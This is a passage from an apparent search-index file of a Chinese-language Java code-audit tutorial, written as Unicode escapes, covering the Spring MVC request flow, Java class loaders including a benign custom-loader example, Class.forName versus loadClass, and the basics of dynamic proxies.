\u627e\u5230\u6e32\u67d3\u6240\u2f64\u7684\u6a21\u677f\uff08\u7b2c\u2f00\u4ef6\u2f24\u4e8b\uff09\u548c\u6240\u2f64\u7684\u6280\u672f\uff08\u7b2c\u2f06\u4ef6\u2f24\u4e8b\uff0c\u5176\u5b9e\u4e5f\u5c31\u662f\u627e\u5230\u89c6\u56fe\u7684\u7c7b\u578b\uff0c\u5982JSP\uff09\u5e76\u586b\u2f0a\u53c2\u6570\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSpring MVC\u4f1a\u2f83\u52a8\u4e3a\u6211\u4eec\u914d\u7f6e\u2f00\u4e2aInternalResourceViewResolver,\u662f\u9488\u5bf9 JSP \u7c7b\u578b\u89c6\u56fe\u7684\u3002\n</code></pre> <p>\u6240\u6709\u8bf7\u6c42\u90fd\u4f1a\u901a\u8fc7DispatcherServlet \u6765\u6267\u884c\u3002</p> <p></p> <p>\u6d41\u7a0b\u8bf4\u660e\uff1a</p> <pre><code>1\u3001DispatcherServlet \u63a5\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u8bf7\u6c42\u3002\n2\u3001DispatcherServlet \u6536\u5230\u8bf7\u6c42\u8c03\u7528HandlerMapping \u5904\u7406\u5668\u6620\u5c04\u5668\u3002\n3\u3001HandleMapping \u6839\u636e\u8bf7\u6c42URL \u627e\u5230\u5bf9\u5e94\u7684handler \u4ee5\u53ca\u5904\u7406\u5668 \u62e6\u622a\u5668\uff0c\u8fd4\u56de\u7ed9DispatcherServlet\n4\u3001DispatcherServlet \u6839\u636ehandler \u8c03\u7528HanderAdapter \u5904\u7406\u5668\u9002\u914d\u5668\u3002\n5\u3001HandlerAdapter \u6839\u636ehandler \u6267\u884c\u5904\u7406\u5668\uff0c\u4e5f\u5c31\u662f\u6211\u4eeccontroller\u5c42\u5199\u7684\u4e1a\u52a1\u903b\u8f91\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2aModeAndView\n6\u3001HandlerAdapter \u8fd4\u56deModeAndView \u7ed9DispatcherServlet\n7\u3001DispatcherServlet \u8c03\u7528 ViewResolver \u89c6\u56fe\u89e3\u6790\u5668\u6765 \u6765\u89e3\u6790ModeAndView\n8\u3001ViewResolve  \u89e3\u6790ModeAndView \u5e76\u8fd4\u56de\u771f\u6b63\u7684view \u7ed9DispatcherServlet\n9\u3001DispatcherServlet \u5c06\u5f97\u5230\u7684\u89c6\u56fe\u8fdb\u884c\u6e32\u67d3\uff0c\u586b\u5145\u5230request\u57df\u4e2d\n10\u3001\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u54cd\u5e94\u7ed3\u679c\u3002\n</code></pre>"},{"location":"Code_audit/Java/Java-3/Java3.html#springmvc_3","title":"springmvc \u6e90\u7801\u5206\u6790","text":"<p>\u8bf7\u6c42\u8fdb\u6765\u3002\u5148\u627eHttpServlet.\u53d1\u73b0FrameworkServlet  \u91cd\u73b0\u4e86doGet()\u548cdoPost() \u65b9\u6cd5\u3002\u6240\u4ee5\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u65b9\u6cd5\u3002</p> <p></p> <p>\u6211\u4eec\u63a5\u7740\u770bFrameworkServlet  \u7684doGet\u548cdoPost \u65b9\u6cd5\u90fd\u662f\u8c03\u7528\u5176processRequest \u65b9\u6cd5\u3002\u8fd9\u4e2a\u65b9\u6cd5\u91cc\u9762\u4e3b\u8981\u7684\u8c03\u7528DispatcherServlet\u4e2ddoService()\u65b9\u6cd5\u3002\u5728DispatcherServlet \u4e2d\u7684\u8fd9\u4e2a\u65b9\u6cd5\u3002\u4f1a\u8c03\u7528doDispatch() \u65b9\u6cd5\u6267\u884c</p> <p></p> <p>\u6240\u4ee5\u6574\u4f53\u7684\u8bf7\u6c42\u6d41\u7a0b\u90fd\u5728doDispatch() \u65b9\u6cd5\u4e2d\u3002\u4e3b\u8981\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>1\u3001\u6839\u636eurl \u8bf7\u6c42\u83b7\u53d6\u5230handlerExecutorChina \u5bf9\u8c61\uff0c\u4e5f\u5c31\u662f\u83b7\u53d6\u5230handler\u6267\u884c\u94fe\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u5305\u542b\u6267\u884c\u7684handler \u548c\u4e00\u4e2a\u62e6\u622a\u5668\u7684\u96c6\u5408\u3002</p> <p></p> <p></p> <p>\u6839\u636e\u8fd9\u4e2ahandlerExecutorChina \u6267\u884c\u94fe\u5bf9\u8c61\u83b7\u53d6\u5230\u5bf9\u5e94\u7684handlerAdapter handler\u9002\u914d\u5668\u3002</p> <p></p> <p>\u6839\u636e\u8fd9\u4e2a\u9002\u914d\u5668\uff0c\u771f\u6b63\u6267\u884chandler ,\u5e76\u4e14\u8fd4\u56de\u4e00\u4e2amodeAndView \u8fd9\u91cc\u7684handler \u5c31\u662f\u6211\u4eec\u901a\u5e38\u6240\u6709\u7684controller \u5c42\u7684\u4e1a\u52a1\u903b\u8f91</p> <p></p> <p>\u6839\u636e\u83b7\u53d6\u5230\u7684modeAndView \uff0c\u89e3\u6790\u6e32\u67d3\u9875\u9762\u5e76\u8fd4\u56de\u7ed3\u679c\u3002</p> <p></p> <p>\u8fd9\u6837\u6574\u4f53\u6838\u5fc3\u6d41\u7a0b\u5c31\u5b8c\u4e86\u3002\u53ea\u6709\u8fd9\u56db\u6b65\u3002\u5176\u5b9e\u548c\u6700\u5f00\u59cb\u7684\u6d41\u7a0b\u5904\u7406\u56fe\u662f\u4e00\u6837\u7684\u3002\u603b\u7ed3\u4e00\u4e0b\uff1a\u5148\u6839\u636e\u8bf7\u6c42\u4ecehandlermapping \u4e2d\u83b7\u53d6\u5230handle ,\u7136\u540e\u901a\u8fc7handle \u627e\u5230\u80fd\u5904\u7406\u8be5\u8bf7\u6c42\u7684 handlerAdapter ,\u901a\u8fc7handlerAdapter \u6267\u884c\u771f\u6b63\u7684handler \u4e5f\u5c31\u662f\u6211\u4eec\u7684\u4e1a\u52a1\u4ee3\u7801\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a ModeAndView \u3002\u7136\u540e\u901a\u8fc7viewResolver \u89e3\u6790\u6210view \u8fd4\u56de\u7ed9\u9875\u9762</p>"},{"location":"Code_audit/Java/Java-4/Java4.html","title":"ClassLoader \u7c7b\u52a0\u8f7d\u673a\u5236","text":"<p>Java \u7a0b\u5e8f\u662f\u7531 class \u6587\u4ef6\u7ec4\u6210\u7684\u4e00\u4e2a\u5b8c\u6574\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u5e76\u4e0d\u4f1a\u4e00\u6b21\u6027\u52a0\u8f7d\u6240\u6709\u7684 class \u6587\u4ef6\u8fdb\u5165\u5185\u5b58\uff0c\u800c\u662f\u901a\u8fc7 Java \u7684\u7c7b\u52a0\u8f7d\u673a\u5236\uff08ClassLoader\uff09\u8fdb\u884c\u52a8\u6001\u52a0\u8f7d\uff0c\u4ece\u800c\u8f6c\u6362\u6210 java.lang.Class \u7c7b\u7684\u4e00\u4e2a\u5b9e\u4f8b\u3002</p>"},{"location":"Code_audit/Java/Java-4/Java4.html#classloader_1","title":"ClassLoader \u7c7b","text":"<p>ClassLoader \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u4e3b\u8981\u7684\u529f\u80fd\u662f\u901a\u8fc7\u6307\u5b9a\u7684\u7c7b\u7684\u540d\u79f0\uff0c\u627e\u5230\u6216\u751f\u6210\u5bf9\u5e94\u7684\u5b57\u8282\u7801\uff0c\u8fd4\u56de\u4e00\u4e2a java.lang.Class \u7c7b\u7684\u5b9e\u4f8b\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u7ee7\u627f ClassLoader \u7c7b\u6765\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u7c7b\u52a0\u8f7d\u5668\u3002</p> <p>ClassLoader \u7c7b\u4e2d\u548c\u52a0\u8f7d\u7c7b\u76f8\u5173\u7684\u65b9\u6cd5:</p> <p></p>"},{"location":"Code_audit/Java/Java-4/Java4.html#loadclass","title":"loadClass()\u65b9\u6cd5\u7684\u6d41\u7a0b","text":"<p>\u524d\u9762\u66fe\u4ecb\u7ecd\u8fc7 loadClass()\u65b9\u6cd5\u53ef\u4ee5\u52a0\u8f7d\u7c7b\u5e76\u8fd4\u56de\u4e00\u4e2a java.lang.Class \u7c7b\u5bf9\u8c61\u3002\u901a\u8fc7\u5982\u4e0b\u6e90\u7801\u53ef\u4ee5\u770b\u51fa\uff0c\u5f53 loadClass()\u65b9\u6cd5\u88ab\u8c03\u7528\u65f6\uff0c\u4f1a\u9996\u5148\u4f7f\u7528 findLoadedClass()\u65b9\u6cd5\u5224\u65ad\u8be5\u7c7b\u662f\u5426\u5df2\u7ecf\u88ab\u52a0\u8f7d\uff0c\u5982\u679c\u672a\u88ab\u52a0\u8f7d\uff0c\u5219\u4f18\u5148\u4f7f\u7528\u52a0\u8f7d\u5668\u7684\u7236\u7c7b\u52a0\u8f7d\u5668\u8fdb\u884c\u52a0\u8f7d\u3002\u5f53\u4e0d\u5b58\u5728\u7236\u7c7b\u52a0\u8f7d\u5668\uff0c\u65e0\u6cd5\u5bf9\u8be5\u7c7b\u8fdb\u884c\u52a0\u8f7d\u65f6\uff0c\u5219\u4f1a\u8c03\u7528\u81ea\u8eab\u7684 findClass()\u65b9\u6cd5\uff0c\u56e0\u6b64\u53ef\u4ee5\u91cd\u5199 findClass()\u65b9\u6cd5\u6765\u5b8c\u6210\u4e00\u4e9b\u7c7b\u52a0\u8f7d\u7684\u7279\u6b8a\u8981\u6c42\u3002\u8be5\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b\u6240\u793a\u3002</p> <pre><code>protected Class&lt;?&gt; loadClass(String name, boolean resolve) \n throws ClassNotFoundException\n    {\n      synchronized (getClassLoadingLock(name)) {\n        Class&lt;?&gt; c = findLoadedClass(name);\n        if (c == null) {\n          long t0 = System.nanoTime();\n          try {\n            if (parent != null) {\n              c = parent.loadClass(name, false);\n            } else {\n              c = findBootstrapClassOrNull(name);\n            }\n          } catch (ClassNotFoundException e) {\n            //\u7701\u7565\n          }\n          if (c == null) {\n            //\u7701\u7565\n            c = findClass(name);\n            //\u7701\u7565\n          }\n        }\n        if (resolve) {\n          resolveClass(c);\n        }\n        return c;\n      }\n    }\n</code></pre>"},{"location":"Code_audit/Java/Java-4/Java4.html#_1","title":"\u81ea\u5b9a\u4e49\u7684\u7c7b\u52a0\u8f7d\u5668","text":"<p>\u6839\u636eloadClass()\u65b9\u6cd5\u7684\u6d41\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u901a\u8fc7\u91cd\u5199findClass()\u65b9\u6cd5\uff0c\u5229\u7528defineClass()\u65b9\u6cd5\u6765\u5c06\u5b57\u8282\u7801\u8f6c\u6362\u6210 java.lang.class \u7c7b\u5bf9\u8c61\uff0c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u7c7b\u52a0\u8f7d\u5668\u3002\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u6240\u793a\u3002</p> <pre><code>import java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class Main extends ClassLoader {\n  private final byte[] bytes ;\n  private String name = \"\";\n  public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, InvocationTargetException {\n    String clzzName = \"com.test.Hello\";\n    byte[] testBytes = new byte[]{\n      -54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 14, 9,\n      0, 15, 0, 16, 8, 0, 17, 10, 0, 18, 0, 19, 7,\n      0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0,\n      3, 40,\n      //\u7701\u7565\n    };\n    Main demo = new Main(clzzName,testBytes);\n    Class&lt;?&gt; clazz = demo.loadClass(clzzName);\n    Constructor&lt;?&gt; constructor = clazz.getConstructor();\n    Object obj = constructor.newInstance();\n    Method method = clazz.getMethod(\"sayHello\");\n    method.invoke(obj);\n  }\n  public Main(String name, byte[] bytes){\n    this.name = name;\n    this.bytes = bytes;\n  }\n  @Override\n  protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException\n  {\n    if(name.equals(this.name)) {\n      defineClass(name, bytes, 0, bytes.length);\n    }\n    return super.findClass(name);\n  }\n}\n</code></pre> <p>\u8be5\u793a\u4f8b\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u5982\u56fe:</p> <p></p>"},{"location":"Code_audit/Java/Java-4/Java4.html#loadclass-classforname","title":"loadClass()\u65b9\u6cd5\u4e0e Class.forName \u7684\u533a\u522b","text":"<p>loadClass()\u65b9\u6cd5\u53ea\u5bf9\u7c7b\u8fdb\u884c\u52a0\u8f7d\uff0c\u4e0d\u4f1a\u5bf9\u7c7b\u8fdb\u884c\u521d\u59cb\u5316\u3002Class.forName \u4f1a\u9ed8\u8ba4\u5bf9\u7c7b\u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u5bf9\u7c7b\u8fdb\u884c\u521d\u59cb\u5316\u65f6\uff0c\u9759\u6001\u7684\u4ee3\u7801\u5757\u5c31\u4f1a\u5f97\u5230\u6267\u884c\uff0c\u800c\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u5219\u9700\u8981\u9002\u5408\u7684\u7c7b\u5b9e\u4f8b\u5316\u624d\u80fd\u5f97\u5230\u6267\u884c\uff0c\u793a\u4f8b\u4ee3\u7801\u5982\u4e0b\u6240\u793a\u3002</p> <pre><code>public class Dog {\n  static {\n    System.out.println(\"\u9759\u6001\u4ee3\u7801\u5757\u6267\u884c\");\n  }\n  {\n    System.out.println(\"\u4ee3\u7801\u5757\u6267\u884c\");\n  }\n  public Dog(){\n    System.out.println(\"\u6784\u9020\u65b9\u6cd5\u6267\u884c\");\n  }\n}\npublic class ClassLoaderTest {\n  public static void main(String[] args) throws ClassNotFoundException {\n    Class.forName(\"Dog\");\n    ClassLoader.getSystemClassLoader().loadClass(\"Dog\");\n  }\n}\n</code></pre> <p>\u8be5\u793a\u4f8b\u4ee3\u7801\u7684\u6267\u884c\u7ed3\u679c\u5982\u56fe</p> <p></p> <p></p> <p></p>"},{"location":"Code_audit/Java/Java-4/Java4.html#urlclassloader","title":"URLClassLoader","text":"<p>URLClassLoader \u7c7b\u662f ClassLoader \u7684\u4e00\u4e2a\u5b9e\u73b0\uff0c\u62e5\u6709\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u52a0\u8f7d\u7c7b\u7684\u80fd\u529b\u3002\u901a\u8fc7 URLClassLoader \u53ef\u4ee5\u5b9e\u73b0\u5bf9\u4e00\u4e9b WebShell \u7684\u8fdc\u7a0b\u52a0\u8f7d\u3001\u5bf9\u67d0\u4e2a\u6f0f\u6d1e\u7684\u6df1\u5165\u5229\u7528\u3002</p>"},{"location":"Code_audit/Java/Java-4/Java4.html#java","title":"Java \u52a8\u6001\u4ee3\u7406","text":"<p>\u4ee3\u7406\u662f Java \u4e2d\u7684\u4e00\u79cd\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u63d0\u4f9b\u5bf9\u76ee\u6807\u5bf9\u8c61\u53e6\u5916\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c\u5373\u901a\u8fc7\u4ee3\u7406\u5bf9\u8c61\u8bbf\u95ee\u76ee\u6807\u5bf9\u8c61\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u5728\u76ee\u6807\u5bf9\u8c61\u5b9e\u73b0\u7684\u57fa\u7840\u4e0a\uff0c\u52a0\u5f3a\u989d\u5916\u7684\u529f\u80fd\u64cd\u4f5c\uff0c\u5b9e\u73b0\u6269\u5c55\u76ee\u6807\u5bf9\u8c61\u7684\u529f\u80fd\u3002</p> <p>\u4ee3\u7406\u6a21\u5f0f\u7684\u5173\u952e\u70b9\u5728\u4e8e\u4ee3\u7406\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\uff0c\u4ee3\u7406\u5bf9\u8c61\u662f\u5bf9\u76ee\u6807\u5bf9\u8c61\u7684\u6269\u5c55\uff0c\u5e76\u4e14\u4ee3\u7406\u5bf9\u8c61\u4f1a\u8c03\u7528\u76ee\u6807\u5bf9\u8c61\u3002</p> <p>Java \u4ee3\u7406\u7684\u65b9\u5f0f\u6709 3 \u79cd\uff1a\u9759\u6001\u4ee3\u7406\u3001\u52a8\u6001\u4ee3\u7406\u548c CGLib \u4ee3\u7406\uff0c\u4e0b\u9762\u5bf9\u8fd9 3 \u79cd\u4ee3\u7406\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002</p>"},{"location":"Code_audit/Java/Java-4/Java4.html#_2","title":"\u9759\u6001\u4ee3\u7406","text":"<p>\u6240\u8c13\u9759\u6001\u4ee3\u7406\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5f53\u786e\u5b9a\u4ee3\u7406\u5bf9\u8c61\u548c\u88ab\u4ee3\u7406\u5bf9\u8c61\u540e\uff0c\u5c31\u65e0\u6cd5\u518d\u53bb\u4ee3\u7406\u53e6\u4e00\u4e2a\u5bf9\u8c61\u3002\u540c\u7406\uff0c\u5728 Java \u9759\u6001\u4ee3\u7406\u4e2d\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5b9e\u73b0\u53e6\u4e00\u4e2a\u4ee3\u7406\uff0c\u5c31\u9700\u8981\u91cd\u65b0\u5199\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u5176\u539f\u7406\u5982\u56fe</p> <p></p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u5728\u9759\u6001\u4ee3\u7406\u4e2d\uff0c\u4ee3\u7406\u7c7b\u548c\u88ab\u4ee3\u7406\u7c7b\u5b9e\u73b0\u4e86\u540c\u6837\u7684\u63a5\u53e3\uff0c\u4ee3\u7406\u7c7b\u540c\u65f6\u6301\u6709\u88ab\u4ee3\u7406\u7c7b\u7684\u5f15\u7528\u3002\u5f53\u6211\u4eec\u9700\u8981\u8c03\u7528\u88ab\u4ee3\u7406\u7c7b\u7684\u65b9\u6cd5\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528\u4ee3\u7406\u7c7b\u7684\u65b9\u6cd5\u5b9e\u73b0\uff0c\u9759\u6001\u4ee3\u7406\u7684\u5b9e\u73b0\u5982\u56fe</p> <p></p>"},{"location":"Code_audit/Java/Java-4/Java4.html#_3","title":"\u52a8\u6001\u4ee3\u7406","text":"<p>\u9759\u6001\u4ee3\u7406\u7684\u4f18\u52bf\u5f88\u660e\u663e\uff0c\u5373\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u5728\u4e0d\u4fee\u6539\u5df2\u6709\u4ee3\u7801\u7684\u524d\u63d0\u4e0b\u5b8c\u6210\u4e00\u4e9b\u589e\u5f3a\u529f\u80fd\u7684\u9700\u6c42\u3002\u4f46\u662f\u9759\u6001\u4ee3\u7406\u7684\u7f3a\u70b9\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u7684\u4f7f\u7528\u4f1a\u7531\u4e8e\u4ee3\u7406\u5bf9\u8c61\u8981\u5b9e\u73b0\u4e0e\u76ee\u6807\u5bf9\u8c61\u4e00\u81f4\u7684\u63a5\u53e3\uff0c\u4ece\u800c\u4ea7\u751f\u8fc7\u591a\u7684\u4ee3\u7406\u7c7b\uff0c\u9020\u6210\u5197\u4f59\uff1b\u5176\u6b21\uff0c\u5927\u91cf\u4f7f\u7528\u9759\u6001 \u4ee3\u7406\u4f1a\u4f7f\u9879\u76ee\u4e0d\u6613\u7ef4\u62a4\uff0c\u4e00\u65e6\u63a5\u53e3\u589e\u52a0\u65b9\u6cd5\uff0c\u76ee\u6807\u5bf9\u8c61\u4e0e\u4ee3\u7406\u5bf9\u8c61\u5c31\u8981\u8fdb\u884c\u4fee\u6539\u3002\u800c\u52a8\u6001\u4ee3\u7406\u7684\u4f18\u52bf\u5728\u4e8e\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5bf9\u4ee3\u7406\u7c7b\u7684\u51fd\u6570\u8fdb\u884c\u7edf\u4e00\u7684\u5904\u7406\uff0c\u800c\u4e0d\u7528\u4fee\u6539\u6bcf\u4e2a\u4ee3\u7406\u7c7b\u4e2d\u7684\u65b9\u6cd5\u3002\u5bf9\u4e8e\u6211\u4eec\u4fe1\u606f\u5b89\u5168\u4eba\u5458\u6765\u8bf4\uff0c\u52a8\u6001\u4ee3\u7406\u610f\u5473\u7740\u4ec0\u4e48\u5462\uff1f\u5b9e\u9645\u4e0a\uff0cJava \u4e2d\u7684\u201c\u52a8\u6001\u201d\u4e5f\u5c31\u610f\u5473\u7740\u4f7f\u7528\u4e86\u53cd\u5c04\uff0c\u56e0\u6b64\u52a8\u6001\u4ee3\u7406\u5176\u5b9e\u662f\u57fa\u4e8e\u53cd\u5c04\u673a\u5236\u7684\u4e00\u79cd\u4ee3\u7406\u6a21\u5f0f\u3002</p> <p>\u52a8\u6001\u4ee3\u7406\u4e0e\u9759\u6001\u4ee3\u7406\u7684\u533a\u522b\u5728\u4e8e\uff0c\u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u53ef\u4ee5\u5b9e\u73b0\u591a\u4e2a\u9700\u6c42\u3002\u52a8\u6001\u4ee3\u7406\u5176\u5b9e\u662f\u901a\u8fc7\u5b9e\u73b0\u63a5\u53e3\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u4ee3\u7406\uff0c\u5177\u4f53\u6765\u8bf4\uff0c\u52a8\u6001\u4ee3\u7406\u662f\u901a\u8fc7 Proxy\u7c7b\u521b\u5efa\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5c06\u63a5\u53e3\u65b9\u6cd5\u201c\u4ee3\u7406\u201d\u7ed9 InvocationHandler \u63a5\u53e3\u5b8c\u6210\u7684\u3002</p> <p></p> <p>\u52a8\u6001\u4ee3\u7406\u7684\u5173\u952e\u6709\u4e24\u4e2a\uff0c\u5373\u4e0a\u6587\u4e2d\u63d0\u5230\u7684 Proxy \u7c7b\u4ee5\u53ca InvocationHandler \u63a5\u53e3\uff0c\u8fd9\u662f\u6211\u4eec\u5b9e\u73b0\u52a8\u6001\u4ee3\u7406\u7684\u6838\u5fc3\u3002</p>"},{"location":"Code_audit/Java/Java-4/Java4.html#1proxy","title":"1\uff0eProxy \u7c7b","text":"<p>\u5728 JDK \u4e2d\uff0cJava \u63d0\u4f9b\u4e86 Java.lang.reflect.InvocationHandler \u63a5\u53e3\u548c Java.lang. reflect.Proxy \u7c7b\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u76f8\u4e92\u914d\u5408\uff0c\u5176\u4e2d Proxy \u7c7b\u662f\u5165\u53e3\u3002Proxy \u7c7b\u662f\u7528\u6765\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\u7684\u7c7b\uff0c\u5b83\u63d0\u4f9b\u4e86\u5f88\u591a\u65b9\u6cd5\u3002</p> <ul> <li><code>static Invocation Handler get Invocation Handler (Object proxy)</code>\uff1a\u8be5\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u83b7\u53d6\u6307\u5b9a\u4ee3\u7406\u5bf9\u8c61\u6240\u5173\u8054\u7684\u8c03\u7528\u7a0b\u5e8f\u3002</li> <li><code>static Class&lt;?&gt; get Proxy Class (ClassLoader loader, Class&lt;?&gt;... interfaces)</code>\uff1a\u8be5\u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u8fd4\u56de\u6307\u5b9a\u63a5\u53e3\u7684\u4ee3\u7406\u7c7b\u3002</li> <li><code>static Object newProxyInstance (ClassLoader loader, Class&lt;?&gt;[] interfaces, Invocation Handler h)</code>\uff1a\u8be5\u65b9\u6cd5\u4e3b\u8981\u8fd4\u56de\u4e00\u4e2a\u6307\u5b9a\u63a5\u53e3\u7684\u4ee3\u7406\u7c7b\u5b9e\u4f8b\uff0c\u8be5\u63a5\u53e3\u53ef\u4ee5\u5c06\u65b9\u6cd5\u8c03\u7528\u6307\u6d3e\u5230\u6307\u5b9a\u7684\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u3002 </li> <li><code>static boolean is Proxy Class (Class&lt;?&gt; cl)</code>\uff1a\u5f53\u4e14\u4ec5\u5f53\u6307\u5b9a\u7684\u7c7b\u901a\u8fc7 <code>get Proxy Class</code> \u65b9\u6cd5\u6216 <code>newProxyInstance</code> \u65b9\u6cd5\u52a8\u6001\u751f\u6210\u4e3a\u4ee3\u7406\u7c7b\u65f6\uff0c\u8fd4\u56de true\u3002\u8be5\u65b9\u6cd5\u7684\u53ef\u9760\u6027\u5bf9\u4e8e\u4f7f\u7528\u5b83\u505a\u51fa\u5b89\u5168\u51b3\u7b56\u800c\u8a00\u975e\u5e38\u91cd\u8981\uff0c\u6240\u4ee5\u5b83\u7684\u5b9e\u73b0\u4e0d\u5e94\u4ec5\u6d4b\u8bd5\u76f8\u5173\u7684\u7c7b\u662f\u5426\u53ef\u4ee5\u6269\u5c55 Proxy\u3002</li> </ul> <p>\u5728\u4e0a\u8ff0\u65b9\u6cd5\u4e2d\uff0c\u6700\u5e38\u7528\u7684\u662f newProxyInstance \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u7684\u4f5c\u7528\u662f\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u7c7b\u5bf9\u8c61\uff0c\u5b83\u63a5\u6536 3 \u4e2a\u53c2\u6570\uff1aloader\u3001interfaces \u4ee5\u53ca h\uff0c\u5404\u4e2a\u53c2\u6570\u542b\u4e49\u5982\u4e0b\u3002</p> <ul> <li><code>loader</code>\uff1a\u8fd9\u662f\u4e00\u4e2a <code>ClassLoader</code> \u5bf9\u8c61\uff0c\u5b9a\u4e49\u4e86\u7531\u54ea\u4e2a <code>ClassLoader</code>\u5bf9\u8c61\u5bf9\u751f\u6210\u7684\u4ee3\u7406\u7c7b\u8fdb\u884c\u52a0\u8f7d\u3002</li> <li><code>interfaces</code>\uff1a\u8fd9\u662f\u4ee3\u7406\u7c7b\u8981\u5b9e\u73b0\u7684\u63a5\u53e3\u5217\u8868\uff0c\u8868\u793a\u7528\u6237\u5c06\u8981\u7ed9\u4ee3\u7406\u5bf9\u8c61\u63d0\u4f9b\u7684\u63a5\u53e3\u4fe1\u606f\u3002\u5982\u679c\u63d0\u4f9b\u4e86\u8fd9\u6837\u4e00\u4e2a\u63a5\u53e3\u5bf9\u8c61\u6570\u7ec4\uff0c\u5c31\u662f\u58f0\u660e\u4ee3\u7406\u7c7b\u5b9e\u73b0\u4e86\u8fd9\u4e9b\u63a5\u53e3\uff0c\u4ee3\u7406\u7c7b\u5373\u53ef\u8c03\u7528\u63a5\u53e3\u4e2d\u58f0\u660e\u7684\u6240\u6709\u65b9\u6cd5\u3002</li> <li><code>h</code>\uff1a\u8fd9\u662f\u6307\u6d3e\u65b9\u6cd5\u8c03\u7528\u7684\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\uff0c\u662f\u4e00\u4e2a <code>InvocationHandler</code>\u5bf9\u8c61\uff0c\u8868\u793a\u5f53\u52a8\u6001\u4ee3\u7406\u5bf9\u8c61\u8c03\u7528\u65b9\u6cd5\u65f6\u4f1a\u5173\u8054\u5230\u54ea\u4e00\u4e2a<code>InvocationHandler</code> \u5bf9\u8c61\u4e0a\uff0c\u5e76\u6700\u7ec8\u7531\u5176\u8c03\u7528\u3002</li> </ul>"},{"location":"Code_audit/Java/Java-4/Java4.html#2invocationhandler","title":"2\uff0eInvocationHandler \u63a5\u53e3","text":"<p>Java.lang.reflect InvocationHandler\uff0c\u4e3b\u8981\u65b9\u6cd5\u4e3a Object invoke\uff08Object proxy, Method method, Object[] args\uff09\uff0c\u8be5\u65b9\u6cd5\u5b9a\u4e49\u4e86\u4ee3\u7406\u5bf9\u8c61\u8c03\u7528\u65b9\u6cd5\u65f6\u5e0c\u671b\u6267\u884c\u7684\u52a8\u4f5c\uff0c\u7528\u4e8e\u96c6\u4e2d\u5904\u7406\u5728\u52a8\u6001\u4ee3\u7406\u7c7b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u8c03\u7528\u3002Invoke \u6709 3 \u4e2a\u53c2\u6570\uff1aproxy\u3001method\u3001args\uff0c\u5404\u4e2a\u53c2\u6570\u542b\u4e49\u5982\u4e0b\u3002</p> <ul> <li>proxy\uff1a\u5728\u5176\u4e0a\u8c03\u7528\u65b9\u6cd5\u7684\u4ee3\u7406\u5b9e\u4f8b\u3002</li> <li>method\uff1a\u5bf9\u5e94\u4e8e\u5728\u4ee3\u7406\u5b9e\u4f8b\u4e0a\u8c03\u7528\u7684\u63a5\u53e3\u65b9\u6cd5\u7684 Method \u5b9e\u4f8b\u3002 Method \u5bf9\u8c61\u7684\u58f0\u660e\u7c7b\u5c06\u662f\u5728\u5176\u4e2d\u58f0\u660e\u65b9\u6cd5\u7684\u63a5\u53e3\uff0c\u8be5\u63a5\u53e3\u53ef\u4ee5\u662f\u4ee3\u7406\u7c7b\u8d56\u4ee5\u7ee7\u627f\u65b9\u6cd5\u7684\u4ee3\u7406\u63a5\u53e3\u7684\u8d85\u63a5\u53e3\u3002</li> 